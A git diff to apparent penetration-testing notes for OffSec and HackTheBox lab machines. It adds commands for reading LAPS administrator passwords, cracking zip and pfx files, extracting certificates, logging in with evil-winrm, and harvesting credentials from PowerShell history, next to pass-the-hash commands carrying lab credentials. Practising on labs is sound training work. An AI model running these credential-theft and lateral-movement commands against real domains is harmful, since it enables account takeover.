@@ -3060,6 +3060,7 @@ ldapsearch -H ldap://192.168.154.122 -b 'DC=hutch,DC=offsec' -x -D 'fmcsorley@hu
 ldapsearch -h 192.168.154.122 -b 'DC=hutch,DC=offsec' -x -D 'fmcsorley@hutch.offsec' -w 'CrabSharkJellyfish192' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd # Sometimes above is not work
 netexec ldap 192.168.154.122 -u fmcsorley -p CrabSharkJellyfish192 --kdcHost 192.168.154.122 -M laps
 netexec ldap 192.168.154.122 -u 'fmcsorley' -p 'CrabSharkJellyfish192' -M laps # same like above
+Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Properties * # Search for this field 'ms-Mcs-AdmPwd'
 python3 pyLAPS.py --action get -u 'fmcsorley' -d 'hutch.offsec' -p 'CrabSharkJellyfish192' --dc-ip 192.168.154.122 # LAPS, pyLAPS
 # I also added a few known account names such as administrator and krbtgt
 netexec smb 192.168.154.122 -u users_ldap.txt -p password.txt --continue-on-success # Admin 'BJhN#,lU/9gvqN'
@@ -3069,6 +3070,26 @@ impacket-wmiexec administrator:'BJhN#,lU/9gvqN'@192.168.154.122 # Admin
 impacket-psexec administrator:'BJhN#,lU/9gvqN'@192.168.154.122 # Admin
 impacket-wmiexec -hashes 'aad3b435b51404eeaad3b435b51404ee:8730fa0d1014eb78c61e3957aa7b93d7' domainadmin@192.168.154.122 # domainadmin able to read proof.txt
 impacket-psexec -hashes 'aad3b435b51404eeaad3b435b51404ee:8730fa0d1014eb78c61e3957aa7b93d7' domainadmin@192.168.154.122 # Admin
+```
+### .pfx and winrm_backup.zip cert.pem key.pm ms-Mcs-AdmPwd read for Windows AD 
+- I have situation has winrm_backup.zip, and some documents realated to ms-Mcs-AdmPwd LAPS password read
+- Through zip2john and pfx2john got the password through openssl get the winrm cert.pem and key.pem using that loggedin then LAPS to got admin password
+- Reference Timelapse from HackTheBox
+````powershell
+zip2john winrm_backup.zip > zip.hash # John cracked the password
+pfx2john legacyy_dev_auth.pfx > pfx.hash # John cracked the password
+openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
+openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
+evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem -S # through user history file got user password
+type C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S # Net user svc_delopy has LAPS read
+# OneWay
+Find-AdmPwdExtendedRights -identity *  # Domain Controllers. Let's look at the right holders
+Find-AdmPwdExtendedRights -identity 'Domain Controllers' | select-object ExtendedRightHolders # LAPS_Readers group has delegation over Domain Controllers
+get-admpwdpassword -computername dc01 | Select password   # Got admin password
+evil-winrm -i 10.10.11.152 -u administrator -p '<RANDOM>' -S
+# Their are different ways to do that nxc and ldapsearch and pyLAPS.py AD computer
+Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Properties *  # look for this string 'ms-Mcs-AdmPwd'
 ```
 
 ### Enable RDP with PowerShell windows
